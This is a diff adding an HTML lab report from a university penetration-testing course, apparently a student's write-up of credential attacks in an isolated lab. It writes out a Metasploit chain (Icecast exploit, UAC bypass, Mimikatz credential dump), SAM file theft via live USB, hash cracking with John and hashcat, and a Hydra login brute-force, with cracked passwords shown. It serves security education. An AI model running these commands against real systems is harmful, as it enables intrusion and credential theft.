@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lab 06 — Attacks on Authentication | CIS*6540</title>
+<style>
+  :root {
+    --navy:   #1a1a2e;
+    --dark:   #16213e;
+    --accent: #e94560;
+    --grey:   #8892a4;
+    --light:  #f4f6f9;
+    --white:  #ffffff;
+    --code-bg:#0d1117;
+    --green:  #2ecc71;
+    --yellow: #f39c12;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    background: var(--navy);
+    color: #cdd6f4;
+    line-height: 1.6;
+  }
+  header {
+    background: linear-gradient(135deg, var(--dark) 0%, #0f3460 100%);
+    border-bottom: 3px solid var(--accent);
+    padding: 48px 40px 36px;
+    text-align: center;
+  }
+  header .badge {
+    display: inline-block;
+    background: var(--accent);
+    color: white;
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    padding: 4px 14px;
+    border-radius: 20px;
+    margin-bottom: 16px;
+  }
+  header h1 {
+    font-size: 2rem;
+    color: white;
+    font-weight: 700;
+    margin-bottom: 8px;
+  }
+  header p { color: var(--grey); font-size: 0.95rem; }
+  header .meta {
+    display: flex;
+    justify-content: center;
+    gap: 28px;
+    margin-top: 20px;
+    flex-wrap: wrap;
+  }
+  header .meta span {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 0.88rem;
+    color: #a6adc8;
+  }
+
+  nav {
+    background: var(--dark);
+    border-bottom: 1px solid #2a2a4a;
+    padding: 0 40px;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    display: flex;
+    gap: 4px;
+    overflow-x: auto;
+  }
+  nav a {
+    color: var(--grey);
+    text-decoration: none;
+    font-size: 0.85rem;
+    padding: 14px 16px;
+    white-space: nowrap;
+    border-bottom: 2px solid transparent;
+    transition: all .2s;
+  }
+  nav a:hover { color: white; border-bottom-color: var(--accent); }
+
+  main { max-width: 1100px; margin: 0 auto; padding: 40px 24px 80px; }
+
+  .section {
+    background: var(--dark);
+    border: 1px solid #2a2a4a;
+    border-radius: 10px;
+    padding: 32px;
+    margin-bottom: 28px;
+  }
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    margin-bottom: 20px;
+    padding-bottom: 14px;
+    border-bottom: 1px solid #2a2a4a;
+  }
+  .section-number {
+    background: var(--accent);
+    color: white;
+    width: 36px; height: 36px;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-weight: 700; font-size: 0.9rem;
+    flex-shrink: 0;
+  }
+  .section-title { font-size: 1.2rem; font-weight: 700; color: white; }
+  .section-sub { font-size: 0.82rem; color: var(--grey); margin-top: 2px; }
+  .marks-badge {
+    margin-left: auto;
+    background: rgba(233,69,96,0.15);
+    border: 1px solid var(--accent);
+    color: var(--accent);
+    font-size: 0.78rem;
+    font-weight: 700;
+    padding: 3px 10px;
+    border-radius: 20px;
+    white-space: nowrap;
+  }
+
+  p { margin-bottom: 12px; font-size: 0.95rem; }
+
+  .cmd-block {
+    background: var(--code-bg);
+    border: 1px solid #30363d;
+    border-left: 3px solid var(--accent);
+    border-radius: 6px;
+    padding: 14px 18px;
+    margin: 12px 0;
+    font-family: 'Courier New', monospace;
+    font-size: 0.85rem;
+    color: #79c0ff;
+    overflow-x: auto;
+    white-space: pre;
+  }
+  .cmd-block .comment { color: #6a737d; }
+  .cmd-block .success { color: var(--green); }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 0.88rem;
+    margin: 14px 0;
+  }
+  thead { background: rgba(233,69,96,0.12); }
+  th { color: white; font-weight: 600; text-align: left; padding: 10px 14px; border-bottom: 2px solid var(--accent); }
+  td { padding: 9px 14px; border-bottom: 1px solid #2a2a4a; color: #cdd6f4; }
+  tr:hover td { background: rgba(255,255,255,0.03); }
+  td .tag {
+    display: inline-block;
+    font-size: 0.75rem;
+    padding: 2px 8px;
+    border-radius: 10px;
+    font-weight: 600;
+  }
+  .tag-dict  { background: rgba(46,204,113,0.15); color: var(--green); border: 1px solid var(--green); }
+  .tag-crack { background: rgba(243,156,18,0.15); color: var(--yellow); border: 1px solid var(--yellow); }
+  .tag-red   { background: rgba(233,69,96,0.15); color: var(--accent); border: 1px solid var(--accent); }
+
+  .screenshot-wrap {
+    background: #0d1117;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+    margin: 18px 0;
+  }
+  .screenshot-wrap img {
+    width: 100%;
+    border-radius: 4px;
+    display: block;
+  }
+  .screenshot-caption {
+    font-size: 0.82rem;
+    color: var(--grey);
+    margin-top: 10px;
+    padding-top: 10px;
+    border-top: 1px solid #2a2a4a;
+  }
+  .screenshot-caption strong { color: #cdd6f4; }
+
+  .result-box {
+    background: rgba(46,204,113,0.08);
+    border: 1px solid rgba(46,204,113,0.3);
+    border-radius: 6px;
+    padding: 14px 18px;
+    margin: 14px 0;
+    font-size: 0.9rem;
+  }
+  .result-box .label { color: var(--green); font-weight: 700; font-size: 0.8rem; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 4px; }
+
+  .warn-box {
+    background: rgba(243,156,18,0.08);
+    border: 1px solid rgba(243,156,18,0.3);
+    border-radius: 6px;
+    padding: 14px 18px;
+    margin: 14px 0;
+    font-size: 0.9rem;
+  }
+  .warn-box .label { color: var(--yellow); font-weight: 700; font-size: 0.8rem; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 4px; }
+
+  .mitre-tag {
+    display: inline-block;
+    background: rgba(233,69,96,0.12);
+    border: 1px solid rgba(233,69,96,0.4);
+    color: var(--accent);
+    font-size: 0.78rem;
+    font-weight: 700;
+    padding: 3px 10px;
+    border-radius: 4px;
+    font-family: monospace;
+    margin: 2px 4px 2px 0;
+  }
+
+  .env-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+    gap: 12px;
+    margin: 16px 0;
+  }
+  .env-card {
+    background: rgba(255,255,255,0.04);
+    border: 1px solid #2a2a4a;
+    border-radius: 8px;
+    padding: 14px 16px;
+  }
+  .env-card .env-label { font-size: 0.75rem; color: var(--grey); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px; }
+  .env-card .env-value { font-size: 0.9rem; color: white; font-weight: 600; }
+  .env-card .env-detail { font-size: 0.8rem; color: var(--grey); font-family: monospace; }
+
+  footer {
+    text-align: center;
+    padding: 28px;
+    color: var(--grey);
+    font-size: 0.83rem;
+    border-top: 1px solid #2a2a4a;
+  }
+  footer a { color: var(--accent); text-decoration: none; }
+
+  h3 { color: white; font-size: 1rem; margin: 18px 0 10px; }
+  ul { padding-left: 20px; margin: 8px 0; }
+  li { margin-bottom: 6px; font-size: 0.92rem; color: #cdd6f4; }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="badge">CIS*6540 · University of Guelph · Summer 2026</div>
+  <h1>Lab 06 — Attacks on Authentication</h1>
+  <p>Advanced Penetration Testing and Exploit Development</p>
+  <div class="meta">
+    <span>👤 Sumesh Kumar</span>
+    <span>🔗 Operation Shadow Hunt</span>
+    <span>📅 July 2026</span>
+    <span>🏆 5/5 + Bonus</span>
+  </div>
+</header>
+
+<nav>
+  <a href="#env">Environment</a>
+  <a href="#p1">Part 1 · Kiwi</a>
+  <a href="#p2a">Part 2a · Cain & Abel</a>
+  <a href="#p2b">Part 2b · Physical</a>
+  <a href="#p3a">Part 3a · JtR</a>
+  <a href="#p3b">Part 3b · Hashcat</a>
+  <a href="#p4a">Part 4a · XAMPP</a>
+  <a href="#p4b">Part 4b · Hydra</a>
+  <a href="#mitre">MITRE</a>
+</nav>
+
+<main>
+
+<!-- ENVIRONMENT -->
+<div class="section" id="env">
+  <div class="section-header">
+    <div class="section-number">🔧</div>
+    <div><div class="section-title">Lab Environment</div><div class="section-sub">Operation Shadow Hunt · VMware Workstation · Host-Only 192.168.80.0/24</div></div>
+  </div>
+  <div class="env-grid">
+    <div class="env-card">
+      <div class="env-label">Attacker</div>
+      <div class="env-value">Kali Linux 2026.1</div>
+      <div class="env-detail">192.168.80.135 (eth1)</div>
+    </div>
+    <div class="env-card">
+      <div class="env-label">Windows 7 Target</div>
+      <div class="env-value">SUMESHKUMAR-PC</div>
+      <div class="env-detail">192.168.80.154 · Icecast2 + WDigest</div>
+    </div>
+    <div class="env-card">
+      <div class="env-label">Windows Server 2016</div>
+      <div class="env-value">WIN-JH4082NO9JH</div>
+      <div class="env-detail">192.168.80.156 · XAMPP + Cain</div>
+    </div>
+    <div class="env-card">
+      <div class="env-label">Host</div>
+      <div class="env-value">Dell Precision 7760</div>
+      <div class="env-detail">VMware Workstation · VMShare</div>
+    </div>
+  </div>
+</div>
+
+<!-- PART 1 -->
+<div class="section" id="p1">
+  <div class="section-header">
+    <div class="section-number">1</div>
+    <div><div class="section-title">Plaintext Credential Extraction — Kiwi (Mimikatz)</div><div class="section-sub">Windows 7 Target · LSASS Memory Dump</div></div>
+    <span class="marks-badge">1 mark</span>
+  </div>
+  <p>Established Meterpreter SYSTEM shell via Icecast buffer overflow, loaded Kiwi, and executed <code>creds_all</code> to extract credentials from LSASS memory. WDigest caching enabled on Windows 7 — plaintext passwords stored in cleartext in LSASS.</p>
+  <h3>Attack Chain</h3>
+  <div class="cmd-block"><span class="comment"># Step 1: Exploit Icecast</span>
+use exploit/windows/http/icecast_header
+set RHOSTS 192.168.80.154
+run
+
+<span class="comment"># Step 2: Escalate to SYSTEM</span>
+use exploit/windows/local/bypassuac_eventvwr
+getsystem
+
+<span class="comment"># Step 3: Extract credentials</span>
+load kiwi
+creds_all</div>
+
+  <div class="result-box">
+    <div class="label">✅ Result</div>
+    <strong>User:</strong> Sumesh Kumar &nbsp;|&nbsp;
+    <strong>Domain:</strong> SumeshKumar-PC &nbsp;|&nbsp;
+    <strong>Password:</strong> Kakasharma@19012
+    <br><small>Extracted from wdigest, tspkg, and kerberos credential stores simultaneously</small>
+  </div>
+  <div class="screenshot-wrap">
+    <img src="screenshots/kiwi_passwords.jpg" alt="Kiwi creds_all output">
+    <div class="screenshot-caption">
+      <strong>Figure 1.a</strong> — creds_all output. Plaintext password <code>Kakasharma@19012</code> visible across wdigest, tspkg, and kerberos sections, confirming LSASS memory dump success under NT AUTHORITY\SYSTEM.
+    </div>
+  </div>
+  <p>
+    <span class="mitre-tag">T1003.001</span>
+    <span class="mitre-tag">T1055</span>
+    <span class="mitre-tag">T1548.002</span>
+  </p>
+</div>
+
+<!-- PART 2a -->
+<div class="section" id="p2a">
+  <div class="section-header">
+    <div class="section-number">2a</div>
+    <div><div class="section-title">NTLM Hash Cracking — Cain & Abel</div><div class="section-sub">sam_win7 · PWDUMP Format · Windows Server 2016</div></div>
+    <span class="marks-badge">0.8 + 0.5 bonus</span>
+  </div>
+  <p>Imported <code>sam_win7</code> (PWDUMP format) into Cain & Abel on Server 2016. Dictionary attack with <code>rockyou.txt</code> cracked 5/6 hashes. Sixth hash submitted to CrackStation rainbow table lookup.</p>
+  <h3>Import Steps</h3>
+  <ul>
+    <li>Cracker tab → LM & NTLM Hashes → right-click → Add to list</li>
+    <li>Import Hashes from a text file (PWDUMP format) → select <code>sam_win7</code></li>
+    <li>6 hashes loaded → Ctrl+A → Dictionary Attack → NTLM Hashes → <code>rockyou.txt</code></li>
+    <li><code>daddy</code> hash <code>1C39AC8DC496087B13267C726C3AE958</code> → CrackStation.net → <code>rainbowchicken</code></li>
+  </ul>
+  <h3>Cracked Credentials</h3>
+  <table>
+    <thead><tr><th>Username</th><th>NT Hash (truncated)</th><th>Password</th><th>Method</th></tr></thead>
+    <tbody>
+      <tr><td>anotherbaby</td><td><code>FB4BF3DDF37C...</code></td><td><strong>princess</strong></td><td><span class="tag tag-dict">rockyou</span></td></tr>
+      <tr><td>baby</td><td><code>F2477A144DFF...</code></td><td><strong>monkey</strong></td><td><span class="tag tag-dict">rockyou</span></td></tr>
+      <tr><td>bigbro</td><td><code>4C090B2A4A9A...</code></td><td><strong>babygirl</strong></td><td><span class="tag tag-dict">rockyou</span></td></tr>
+      <tr><td>biggerbro</td><td><code>328727B81CA0...</code></td><td><strong>1234567</strong></td><td><span class="tag tag-dict">rockyou</span></td></tr>
+      <tr><td>bigsis</td><td><code>9EBD81FA14D6...</code></td><td><strong>heaven</strong></td><td><span class="tag tag-dict">rockyou</span></td></tr>
+      <tr><td>daddy</td><td><code>1C39AC8DC496...</code></td><td><strong>rainbowchicken</strong></td><td><span class="tag tag-crack">CrackStation</span></td></tr>
+    </tbody>
+  </table>
+  <div class="screenshot-wrap">
+    <img src="screenshots/ca_win7.jpg" alt="Cain & Abel NTLM results">
+    <div class="screenshot-caption"><strong>Figure 2.a</strong> — Cain & Abel Cracker panel. 5 NT passwords visible in the NT Password column. LM hashes disabled (empty) — only NTLM hashes present, confirming modern Windows hash storage.</div>
+  </div>
+  <div class="screenshot-wrap">
+    <img src="screenshots/daddy_crackstation.jpg" alt="CrackStation daddy hash">
+    <div class="screenshot-caption"><strong>Figure 2.a (supplement)</strong> — CrackStation NTLM lookup. Hash <code>1C39AC8DC496087B13267C726C3AE958</code> → <code>rainbowchicken</code>. Green = exact match. Confirms all 6/6 passwords recovered.</div>
+  </div>
+  <p><span class="mitre-tag">T1110.002</span></p>
+</div>
+
+<!-- PART 2b -->
+<div class="section" id="p2b">
+  <div class="section-header">
+    <div class="section-number">2b</div>
+    <div><div class="section-title">Physical Access: SAM Extraction via Bootable Media</div><div class="section-sub">No credentials · No exploits · No network required</div></div>
+    <span class="marks-badge">0.2 mark</span>
+  </div>
+  <p>Physical access to an unencrypted Windows Server 2016 machine enables full SAM file extraction without any credentials or vulnerability exploitation.</p>
+  <h3>Procedure</h3>
+  <div class="cmd-block"><span class="comment"># Boot from Kali Linux live USB</span>
+fdisk -l                                      <span class="comment"># identify Windows partition</span>
+mount /dev/sda2 /mnt/windows                  <span class="comment"># mount NTFS partition</span>
+cd /mnt/windows/Windows/System32/config/
+cp SAM SYSTEM /media/usb/                     <span class="comment"># exfiltrate credential files</span>
+
+<span class="comment"># On attacker machine — extract NTLM hashes</span>
+samdump2 SYSTEM SAM > hashes.txt
+<span class="comment"># Import hashes.txt into Cain & Abel or Hashcat</span></div>
+  <div class="warn-box">
+    <div class="label">⚠ Constraint</div>
+    BitLocker full-disk encryption blocks partition mounting at step 2. Absent encryption, no credentials, exploits, or network access are required — physical access alone achieves full credential extraction.
+  </div>
+</div>
+
+<!-- PART 3a -->
+<div class="section" id="p3a">
+  <div class="section-header">
+    <div class="section-number">3a</div>
+    <div><div class="section-title">Linux Shadow Cracking — John the Ripper</div><div class="section-sub">shadow_ubuntu8 · MD5crypt ($1$) · Ubuntu 8</div></div>
+    <span class="marks-badge">0.5 mark</span>
+  </div>
+  <h3>Commands</h3>
+  <div class="cmd-block">john ~/Desktop/shadow_ubuntu8
+john ~/Desktop/shadow_ubuntu8 --wordlist=/usr/share/wordlists/rockyou.txt
+john ~/Desktop/shadow_ubuntu8 --show</div>
+  <h3>Results — 6/7 Cracked</h3>
+  <table>
+    <thead><tr><th>Username</th><th>Hash Type</th><th>Password</th></tr></thead>
+    <tbody>
+      <tr><td>baby</td><td><code>$1$ md5crypt</code></td><td><strong>iloveyou</strong></td></tr>
+      <tr><td>anotherbaby</td><td><code>$1$ md5crypt</code></td><td><strong>spiderman</strong></td></tr>
+      <tr><td>yetanotherbaby</td><td><code>$1$ md5crypt</code></td><td><strong>prince</strong></td></tr>
+      <tr><td>bigbro</td><td><code>$1$ md5crypt</code></td><td><strong>harrypotter</strong></td></tr>
+      <tr><td>biggerbro</td><td><code>$1$ md5crypt</code></td><td><strong>gangsta</strong></td></tr>
+      <tr><td>bigsis</td><td><code>$1$ md5crypt</code></td><td><strong>newyork</strong></td></tr>
+      <tr><td>daddy</td><td><code>$1$ md5crypt</code></td><td><em style="color:var(--grey)">not cracked (rockyou exhausted; empty salt blocks rainbow lookup)</em></td></tr>
+    </tbody>
+  </table>
+  <div class="screenshot-wrap">
+    <img src="screenshots/jtr_ubuntu8.jpg" alt="John the Ripper output">
+    <div class="screenshot-caption"><strong>Figure 3.a</strong> — <code>john --show</code> output. 6 password hashes cracked, 1 remaining. Hash type auto-detected as md5crypt. All cracked passwords recovered via built-in password.lst + rockyou wordlist.</div>
+  </div>
+  <p><span class="mitre-tag">T1110.002</span></p>
+</div>
+
+<!-- PART 3b -->
+<div class="section" id="p3b">
+  <div class="section-header">
+    <div class="section-number">3b</div>
+    <div><div class="section-title">Linux Shadow Cracking — Hashcat</div><div class="section-sub">shadow_ubuntu18 · SHA-256crypt ($5$) · Mode 7400</div></div>
+    <span class="marks-badge">0.5 + 0.5 bonus</span>
+  </div>
+  <h3>Commands</h3>
+  <div class="cmd-block"><span class="comment"># Extract raw hashes — strip username and metadata</span>
+cut -d: -f2 ~/Desktop/shadow_ubuntu18 > ~/Desktop/hashes18.txt
+
+<span class="comment"># Crack all 7 hashes — sha256crypt mode 7400</span>
+hashcat -m 7400 ~/Desktop/hashes18.txt /usr/share/wordlists/rockyou.txt
+
+<span class="comment"># daddy isolated run</span>
+grep daddy ~/Desktop/shadow_ubuntu18 | cut -d: -f2 > ~/Desktop/daddy18.txt
+hashcat -m 7400 ~/Desktop/daddy18.txt /usr/share/wordlists/rockyou.txt
+
+<span class="comment"># Show all cracked</span>
+hashcat -m 7400 ~/Desktop/hashes18.txt /usr/share/wordlists/rockyou.txt --show</div>
+  <h3>Results — 7/7 Cracked (Full Bonus)</h3>
+  <table>
+    <thead><tr><th>Username</th><th>Hash Type</th><th>Password</th><th>Runtime</th></tr></thead>
+    <tbody>
+      <tr><td>anotherbaby</td><td><code>$5$ sha256crypt</code></td><td><strong>password</strong></td><td>&lt;1 min</td></tr>
+      <tr><td>baby</td><td><code>$5$ sha256crypt</code></td><td><strong>loveme</strong></td><td>&lt;1 min</td></tr>
+      <tr><td>yetanotherbaby</td><td><code>$5$ sha256crypt</code></td><td><strong>angel</strong></td><td>&lt;1 min</td></tr>
+      <tr><td>bigbro</td><td><code>$5$ sha256crypt</code></td><td><strong>jordan</strong></td><td>&lt;1 min</td></tr>
+      <tr><td>biggerbro</td><td><code>$5$ sha256crypt</code></td><td><strong>sunshine</strong></td><td>&lt;1 min</td></tr>
+      <tr><td>bigsis</td><td><code>$5$ sha256crypt</code></td><td><strong>basketball</strong></td><td>&lt;1 min</td></tr>
+      <tr><td>daddy</td><td><code>$5$ sha256crypt</code></td><td><strong>diamondforever</strong></td><td>~5 min (4.67% of rockyou)</td></tr>
+    </tbody>
+  </table>
+  <div class="screenshot-wrap">
+    <img src="screenshots/hc_ubuntu18.jpg" alt="Hashcat output">
+    <div class="screenshot-caption"><strong>Figure 3.b</strong> — hashcat --show output. All 7 SHA-256crypt hashes cracked including <code>daddy:diamondforever</code>. Status: Cracked. Mode 7400 confirmed. Full bonus achieved.</div>
+  </div>
+  <p><span class="mitre-tag">T1110.002</span></p>
+</div>
+
+<!-- PART 4a -->
+<div class="section" id="p4a">
+  <div class="section-header">
+    <div class="section-number">4a</div>
+    <div><div class="section-title">XAMPP Deployment — Login Target Setup</div><div class="section-sub">Windows Server 2016 · 192.168.80.156 · Port 80</div></div>
+    <span class="marks-badge">0.5 mark</span>
+  </div>
+  <ul>
+    <li>Installed XAMPP 7.2.26 (x64) — Apache only — default options</li>
+    <li>Deployed <code>login.html</code> + <code>login.php</code> to <code>C:\xampp\htdocs\</code></li>
+    <li>Edited <code>login.php</code>: <code>$usr="Sumesh"; $pwd="Kumar"; $hf="myhiddenfield";</code></li>
+    <li>Apache started — port 80 confirmed active from XAMPP Control Panel</li>
+    <li>Login verified on <code>http://localhost/login.html</code> — response: <em>Login successful</em></li>
+  </ul>
+  <h3>POST Field Map (verified from source)</h3>
+  <table>
+    <thead><tr><th>Field</th><th>Value</th><th>Purpose</th></tr></thead>
+    <tbody>
+      <tr><td><code>uname</code></td><td>username</td><td>Username field</td></tr>
+      <tr><td><code>pass</code></td><td>password</td><td>Password field</td></tr>
+      <tr><td><code>hiddenfield</code></td><td>myhiddenfield</td><td>Hidden form field (required)</td></tr>
+      <tr><td>Failure string</td><td>Failed</td><td>Hydra failure detection string</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<!-- PART 4b -->
+<div class="section" id="p4b">
+  <div class="section-header">
+    <div class="section-number">4b</div>
+    <div><div class="section-title">HTTP Form Brute-Force — Hydra</div><div class="section-sub">http-post-form · 192.168.80.156:80/login.php</div></div>
+    <span class="marks-badge">1.5 marks</span>
+  </div>
+  <h3>Wordlists</h3>
+  <div class="cmd-block">echo -e "Sumesh\nwronguser" > ~/Desktop/users.txt
+echo -e "Kumar\nwrongpassword" > ~/Desktop/passwords.txt</div>
+  <h3>Attack Command</h3>
+  <div class="cmd-block">hydra -L ~/Desktop/users.txt -P ~/Desktop/passwords.txt 192.168.80.156 \
+  http-post-form "/login.php:uname=^USER^&pass=^PASS^&hiddenfield=myhiddenfield:Failed"</div>
+  <h3>Attack Parameters</h3>
+  <table>
+    <thead><tr><th>Parameter</th><th>Value</th></tr></thead>
+    <tbody>
+      <tr><td>Target</td><td><code>192.168.80.156:80</code></td></tr>
+      <tr><td>Protocol</td><td>http-post-form</td></tr>
+      <tr><td>Endpoint</td><td>/login.php</td></tr>
+      <tr><td>POST fields</td><td><code>uname=^USER^&pass=^PASS^&hiddenfield=myhiddenfield</code></td></tr>
+      <tr><td>Failure string</td><td>Failed</td></tr>
+      <tr><td>Total attempts</td><td>4 (2 users × 2 passwords)</td></tr>
+    </tbody>
+  </table>
+  <div class="result-box">
+    <div class="label">✅ Credential Found</div>
+    <code>[80][http-post-form] host: 192.168.80.156 &nbsp; login: Sumesh &nbsp; password: Kumar</code><br>
+    <small>1 of 1 target successfully completed, 1 valid password found</small>
+  </div>
+  <div class="screenshot-wrap">
+    <img src="screenshots/hydra_online_attack.jpg" alt="Hydra output">
+    <div class="screenshot-caption"><strong>Figure 4.b</strong> — Hydra terminal. Full command visible (not redacted). Success line confirms <code>login: Sumesh / password: Kumar</code>. No rate-limiting or account lockout present on target — 4 attempts sufficient.</div>
+  </div>
+  <p><span class="mitre-tag">T1110.001</span></p>
+</div>
+
+<!-- MITRE SUMMARY -->
+<div class="section" id="mitre">
+  <div class="section-header">
+    <div class="section-number">⚔</div>
+    <div><div class="section-title">MITRE ATT&CK Coverage</div></div>
+  </div>
+  <table>
+    <thead><tr><th>Technique ID</th><th>Name</th><th>Tool Used</th><th>Phase</th></tr></thead>
+    <tbody>
+      <tr><td><span class="mitre-tag">T1003.001</span></td><td>OS Credential Dumping: LSASS Memory</td><td>Kiwi / Mimikatz</td><td>Credential Access</td></tr>
+      <tr><td><span class="mitre-tag">T1548.002</span></td><td>Abuse Elevation Control: Bypass UAC</td><td>bypassuac_eventvwr</td><td>Privilege Escalation</td></tr>
+      <tr><td><span class="mitre-tag">T1110.002</span></td><td>Brute Force: Password Cracking</td><td>Cain & Abel · JtR · Hashcat</td><td>Credential Access</td></tr>
+      <tr><td><span class="mitre-tag">T1110.001</span></td><td>Brute Force: Password Guessing</td><td>Hydra</td><td>Credential Access</td></tr>
+      <tr><td><span class="mitre-tag">T1078</span></td><td>Valid Accounts</td><td>All phases</td><td>Defense Evasion</td></tr>
+    </tbody>
+  </table>
+</div>
+
+</main>
+
+<footer>
+  Lab 06 — Attacks on Authentication &nbsp;|&nbsp; CIS*6540 Advanced Penetration Testing &nbsp;|&nbsp; University of Guelph · Summer 2026<br>
+  <a href="https://github.com/prashersumesh">github.com/prashersumesh</a> &nbsp;|&nbsp; Operation Shadow Hunt Lab Series
+</footer>
+
+</body>
+</html>
